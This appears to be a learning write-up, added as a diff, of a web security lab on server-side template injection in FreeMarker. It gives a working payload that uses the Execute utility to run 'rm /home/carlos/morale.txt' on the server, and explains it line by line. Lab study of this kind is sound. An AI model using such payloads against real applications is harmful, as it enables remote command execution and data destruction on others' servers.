@@ -1,0 +1,43 @@
+This lab is vulnerable to server-side template injection. 
+
+To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
+
+intially looking at the post seen there was a description and edit template part of the website.
+
+this was the injection point for server side template injection, using the test case of sending an invalid request gave the error showing
+the template engine of freemarker.
+
+initially asking chatgpt was not working as it gave the examples of:
+<#assign filePath = "/home/carlos/morale.txt">
+<#assign file = new java.io.File(filePath)>
+<#if file.exists()>
+  <#if file.delete()>
+    File deleted successfully.
+  <#else>
+    Failed to delete the file.
+  </#if>
+<#else>
+  File does not exist.
+</#if>
+
+which didnt work
+
+then looking at the documentation security part wasnt really helpful... therefore did some googling and this came up:
+
+
+
+using the following albinowax (james kettle) executable i was able to solve the lab:
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
+
+
+
+
+this payload works in the following way:
+
+<#assign ex="freemarker.template.utility.Execute"?new()>: 
+This line assigns a new instance of the freemarker.template.utility.Execute class to the variable ex. 
+This class is a part of FreeMarker's utility package and provides functionality to execute commands.
+
+${ ex("rm /home/carlos/morale.txt") }: 
+This line calls the ex object with the command rm /home/carlos/morale.txt as an argument. 
+The ex object, being an instance of the Execute class, interprets this command and attempts to execute it on the server.
